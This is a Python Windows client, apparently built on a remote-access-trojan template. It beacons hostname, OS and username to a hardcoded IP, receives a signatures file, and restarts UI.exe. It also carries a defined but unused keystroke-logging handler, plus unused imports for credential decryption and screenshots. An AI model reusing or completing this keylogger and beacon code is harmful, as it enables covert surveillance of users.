import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard
import win32api, winerror, win32event, win32crypt
from shutil import copyfile
from winreg import *
import datetime
import wmi
import os


strHost = "10.5.29.45"
# strHost = socket.gethostbyname("")
intPort = 5688
fileChanged = 0

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]


# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")

def create_socket():
    global objSocket 
    try:
        objSocket = socket.socket()
        objSocket.connect((strHost, intPort))
        strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
        objSocket.send(str.encode(strUserInfo))
        del strUserInfo
        execute_command()
    except socket.error:
        return

      # delete data after it has been sent


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += " [" + str(event)[4:] + "] "
    else:
        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer,objSocket):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = objSocket.recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData

def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer,objSocket)
    strOutputFile = decode_utf8(objSocket.recv(1024))
    try:
        objFile = open("tempSignatures.txt", "wb")
        objFile.write(file_data)
        objFile.close()
        objSocket.send(str.encode("Done!!!"))
    except:
        objSocket.send(str.encode("Path is protected/invalid!"))

    result = compareFiles()
    if(result == False):
        global fileChanged
        transferFiles()
        saveTransaction()
        fileChanged = 1
    
    print (objSocket)
    objSocket.close()
    print (objSocket)
    time.sleep(5)
    # sys.exit(0)

def saveTransaction():
    currentDT = datetime.datetime.now()
    currentDT = str(currentDT)

    with open("Transactions.txt",'r') as f:
        lisOfTransactions = f.read()
        if (len(lisOfTransactions) != 0 ):
            lisOfTransactions = lisOfTransactions.splitlines()
            lisOfTransactions = lisOfTransactions[-2]
            digit1 = int(lisOfTransactions[0])
            digit2 = lisOfTransactions[1]
            if (digit2 != '.'):
                number = int(str(digit1) + str(digit2))
            else:
                number = digit1
            number += 1
        else:
            number = 1


    with open("Transactions.txt",'a+') as f:
        f.write(str(number) + ". " + "File received from " + strHost + " at " + currentDT + "\n" + "\n")
        f.close()

    c = wmi.WMI()
    i = 0
    for process in c.Win32_Process ():
        if (process.Name == 'UI.exe'):
            print('its found')
            result = process.Terminate()
            if(i == 0):

                os.system('start UI.exe')
                i+=1


def transferFiles():
    with open ("tempSignatures.txt",'r') as f1:
        data = f1.read()
        with open("signatures.txt",'w') as f2:
            f2.write(data)
            f2.close()
        f1.close()

def compareFiles():
    with open("tempSignatures.txt",'r') as f:
        lines = f.read().splitlines()
        lastTempSignature = lines[-1]

    with open("signatures.txt",'r') as f:
        lines = f.read().splitlines()
        lastSignature = lines[-1]

    if(lastTempSignature == lastSignature):
        return True
    else:
        return False

def execute_command():
    # try:
    strData = objSocket.recv(1024)
    strData = decode_utf8(strData)
    if strData == "exit":
        objSocket.close()
        sys.exit(0)
    elif strData[:4] == "send":
        upload(strData[4:])
    # except socket.error:  # if the server closes without warning
    #     objSocket.close()
    #     sys.exit(0)


# create_socket()